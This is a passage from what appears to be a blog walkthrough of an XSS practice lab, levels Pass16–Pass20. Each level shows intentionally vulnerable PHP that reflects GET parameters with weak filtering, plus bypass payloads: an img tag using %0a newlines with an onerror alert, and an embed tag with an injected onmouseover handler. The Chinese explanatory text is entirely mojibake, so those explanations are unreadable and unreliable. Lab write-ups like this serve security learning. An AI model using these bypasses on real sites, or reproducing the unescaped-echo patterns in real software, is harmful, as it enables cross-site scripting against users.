<p>ä½†æ˜¯è¿™ä¸ªè¯·æ±‚ä¼šè¢«å‘é€åˆ°åç«¯ï¼Œè¿™æ—¶è¿™äº›å®ä½“å°±åˆå˜æˆä»¥å‰çš„å­—ç¬¦ã€‚è€Œåç«¯å¤„ç†å®Œè¯·æ±‚ï¼Œå°±æŠŠé¡µé¢è¿”å›äº†ï¼Œè¿™ä¸ªé¡µé¢æ˜¯ä¸€ä¸ªæ•´ä½“ï¼ŒGETå‚æ•°å·²ç»è¢«å®ç°äº†ã€‚</p>
</blockquote>
<h2 id="å°é—®é¢˜"><a href="#å°é—®é¢˜" class="headerlink" title="å°é—®é¢˜"></a>å°é—®é¢˜</h2><blockquote>
<p>è¿™é‡Œè™½ç„¶æœ‰htmlspecialcharsï¼Œä½†æ˜¯å¹¶ä¸å½±å“ã€‚</p>
</blockquote>
<p>è¿™é‡Œå¼•ç”³å‡ºäº†htmlspecialcharsçš„ç¼–ç çš„æœ‰æ•ˆåŸŸ</p>
<p>è¿˜æœ‰ng-includeåŒ…å«æ–‡ä»¶çš„è¿ä½œæœºåˆ¶</p>
<h1 id="Pass16ã€imgæ ‡ç­¾-0aæ¢è¡Œã€‘"><a href="#Pass16ã€imgæ ‡ç­¾-0aæ¢è¡Œã€‘" class="headerlink" title="Pass16ã€imgæ ‡ç­¾+%0aæ¢è¡Œã€‘"></a>Pass16ã€imgæ ‡ç­¾+%0aæ¢è¡Œã€‘</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"&amp;nbsp;"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">" "</span>,<span class="string">"&amp;nbsp;"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"/"</span>,<span class="string">"&amp;nbsp;"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"	"</span>,<span class="string">"&amp;nbsp;"</span>,$str4);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>.$str5.<span class="string">"&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨imgæ ‡ç­¾ï¼Œä½†å‘ç°è¿˜è¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ‰€ä»¥ç”¨%0aã€æ¢è¡Œã€‘ã€‚</p>
<blockquote>
<p>åœ¨HTMLä¸­å¯ä»¥å°†%0aæˆ–è€…%0Då½“æˆç©ºæ ¼ä½¿ç”¨ã€‚</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0asrc&#x3D;1%0aonerror&#x3D;alert(&#39;xss&#39;)&gt;</span><br></pre></td></tr></table></figure>









<h1 id="Pass17ã€å‚æ•°ã€‘"><a href="#Pass17ã€å‚æ•°ã€‘" class="headerlink" title="Pass17ã€å‚æ•°ã€‘"></a>Pass17ã€å‚æ•°ã€‘</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf01.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ç»™embedæ ‡ç­¾åŠ å±æ€§</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01&#x3D; onmouseover&amp;arg02&#x3D;alert(&#x2F;xss&#x2F;)</span><br></pre></td></tr></table></figure>

<p>å³</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed src&#x3D;xsf01.swf? onmouseover&#x3D;alert(&#x2F;xss&#x2F;) width&#x3D;100% heigth&#x3D;100%&gt;</span><br></pre></td></tr></table></figure>







<h1 id="Pass18ã€å‚æ•°2ã€‘"><a href="#Pass18ã€å‚æ•°2ã€‘" class="headerlink" title="Pass18ã€å‚æ•°2ã€‘"></a>Pass18ã€å‚æ•°2ã€‘</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf02.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸å’ŒPass17ä¸€æ ·å—ã€‚ã€‚ã€‚å¯èƒ½æ˜¯swfæ–‡ä»¶æœ‰å·®åˆ«ï¼Œä½†æ˜¯ç›®å‰è¿˜æœ‰äº›æ‡µã€‚</p>
<h1 id="Pass19ã€Flash-XSSã€‘"><a href="#Pass19ã€Flash-XSSã€‘" class="headerlink" title="Pass19ã€Flash XSSã€‘"></a>Pass19ã€Flash XSSã€‘</h1><p><a href="https://blog.csdn.net/u014029795/article/details/103213877" target="_blank" rel="noopener">å¤§ä½¬æ–‡ç« </a></p>
<h1 id="Pass20ã€Flash-XSSï¼ˆåä»£ç å®¡è®¡ï¼‰ã€‘"><a href="#Pass20ã€Flash-XSSï¼ˆåä»£ç å®¡è®¡ï¼‰ã€‘" class="headerlink" title="Pass20ã€Flash XSSï¼ˆåä»£ç å®¡è®¡ï¼‰ã€‘"></a>Pass20ã€Flash XSSï¼ˆåä»£ç å®¡è®¡ï¼‰ã€‘</h1><p><a href="https://blog.csdn.net/u014029795/article/details/103217680" target="_blank" rel="noopener">å¤§ä½¬æ–‡ç« </a></p>
</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-chevron-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By George</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body></html>